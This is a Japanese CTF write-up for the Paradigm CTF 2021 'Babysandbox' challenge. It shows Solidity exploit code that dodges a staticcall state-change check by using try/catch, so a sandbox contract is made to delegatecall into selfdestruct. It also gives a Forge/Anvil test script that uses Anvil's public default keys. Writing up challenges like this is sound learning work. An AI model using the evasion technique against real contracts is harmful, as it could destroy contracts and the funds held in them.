# Paradigm CTF 2021: Babysandbox

## ソース
- [問題コントラクト](challenge)
- [Exploit](BabysandboxExploit.sol)
- [Test](test_exploit.sh)

## 概要
`Babysandbox`コントラクトの`run`関数で`selfdestruct`を実行する問題。ただしステート変化の検知を回避する必要がある。

## Writeup
`assembly`ブロックの1つ目のif文の条件を満たせば、`run`関数の引数であるアドレス`code`に対してdelegatecallできる。

```solidity
if eq(caller(), address()) {
    switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
    case 0 {
        returndatacopy(0x00, 0x00, returndatasize())
        revert(0x00, returndatasize())
    }
    case 1 {
        returndatacopy(0x00, 0x00, returndatasize())
        return(0x00, returndatasize())
    }
}
```

よって、アドレス`code`のコントラクトで`selfdestruct`すれば解けそうであるが、単純に`fallback`関数で`selfdestruct`しても失敗する。
というのも、delegatecallを実行する前に`code`に対して同じcalldata (=`""`)でstaticcallが実行され、そのstaticcallが失敗すると、その時点で`run`関数はrevertされる。
つまり、staticcallで`selfdestruct`のようなステートが変化する処理を単純に実行してしまうとdelegatecallに辿り着けない。

```solidity
// run using staticcall
// if this fails, then the code is malicious because it tried to change state
if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) { revert(0x00, 0x00) }

// if we got here, the code wasn't malicious
// run without staticcall since it's safe
switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
case 0 { returndatacopy(0x00, 0x00, returndatasize()) }
// revert(0x00, returndatasize())
case 1 {
    returndatacopy(0x00, 0x00, returndatasize())
    return(0x00, returndatasize())
}
```

### staticcallを無視したexploit
一旦staticcallでのステート変化の検知を無視する。
delegatecallを実行するには、if文の条件「`caller()`と`address()`の一致」を満たす必要がある。
これは、sandbox内からcallすれば良い。

`call(0x4000, address(), 0, 0, calldatasize(), 0, 0)`の部分を考える。callの引数は、順に`gas`, `address`, `value`, `argsOffset`, `argsSize`, `retOffset`, `retSize`の7つ。
`calldatacopy`によってcalldataはメモリにコピー済みなので、calldata（runの実行部）がそのまま渡されることになる。そしてdelegatecallが`code`に対して実行される。

なので、staticcallを無視すれば、以下のexploitで良い。
```solidity
contract BabysandboxExploit {
    fallback() external {
        selfdestruct(payable(address(0)));
    }
}
```

### staticcallを考慮したexploit
staticcallによってステートの変化が起きる`selfdestruct`は単純に実行できずrevertされる。
しかし1回目のコール（staticcall）と2回目のコール（call）を区別する方法はない。
こういった場合、try/catch文を使えばstaticcallを失敗させずにcallに辿り着き実行を継続させられる。
try文の式には外部関数コールとコントラクト作成のみ指定できるから、外部関数コールで別のコントラクトのステートが変化できるかどうかを試し、もし変化可能ならdelegatecallを実行、そうでないなら何もしない、というようにすれば、staticcallのステート変化検知によるrevertを回避できる。

例えば、以下のようなコードを思いつく。
```solidity
contract StateChange {
    uint a = 0;
    function f() external {
        a++;
    }
}

contract BabysandboxExploit {
    StateChange immutable stateChange;

    constructor() {
        stateChange = new StateChange();
    }

    fallback() external {
        try stateChange.f() {
            selfdestruct(payable(address(0)));
        }
        catch {}
    }
}
```

しかし、これは`OutOfGas`になる。callの`0x4000` (`16384`) gasの制限に引っかかるためである。
これに対処するには`StateChange`の変数を無くし、`selfdestruct`にすると良い。`selfdestruct`を使うことで使えるガス代が増える（関連: [EIP-2200: Structured Definitions for Net Gas Metering ](https://eips.ethereum.org/EIPS/eip-2200), [EIP-3298: Removal of refunds](https://eips.ethereum.org/EIPS/eip-3298)。
最終的なexploitは以下。

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract StateChange {
    function f() external {
        selfdestruct(payable(address(0)));
    }
}

contract BabysandboxExploit {
    StateChange immutable stateChange;

    constructor() {
        stateChange = new StateChange();
    }

    fallback() external {
        try stateChange.f() {
            selfdestruct(payable(address(0)));
        } catch {}
    }
}
```

### Test

```
bash src/ParadigmCTF2021/Babysandbox/test_exploit.sh
```

**Testの解説**

Forgeのtestはtransaction-baseであるため、テストの間は`extcodesize`の結果が変わらない。
Forgeのscript機能とAnvilを組み合わせることでテストを行う。まずはsetup用とplayer用の2つのアカウントを決める。今回はAnvilのデフォルトアカウント（0番目と1番目）を使う。

```sh
export RPC_ANVIL=http://127.0.0.1:8545
export FOUNDRY_ETH_RPC_URL=$RPC_ANVIL

# Anvil account 0
export PRIVATE_KEY_SETUP=ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
# Anvil account 1
export PRIVATE_KEY_PLAYER=59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

次にAnvilを起動する。
```sh
anvil --silent 1>/dev/null &
sleep 1
```
`sleep`は使いたくないが、これを挟んでAnvilが完全に起動するまで待たないと次に実行する`forge script`でRPCのエラーが起きる。

scriptを実行する。
```sh
forge script BabysandboxExploitTestScript --fork-url $RPC_ANVIL --broadcast --private-keys $PRIVATE_KEY_SETUP --private-keys $PRIVATE_KEY_PLAYER --gas-limit 1000000 --gas-estimate-multiplier 200 -vvvvv
```
現在、Forgeのscriptで個別のトランザクションにgasを指定する方法が存在しないため、`--gas-estimate-multiplier 200`を指定する必要がある。関連issue: https://github.com/foundry-rs/foundry/issues/2627 。


解けたかどうか`cast call`で確認する。
```sh
# 31337: chain id of Anvil
SETUP_ADDRESS=$(python -c 'import json; print(json.load(open("broadcast/BabysandboxExploitTest.s.sol/31337/run-latest.json"))["transactions"][0]["contractAddress"])')
# A result of EXTCODESIZE remains the same until a transaction is terminated.
SOLVED=$(cast call $SETUP_ADDRESS "isSolved()(bool)")

pkill anvil

echo "Result:" $SOLVED
```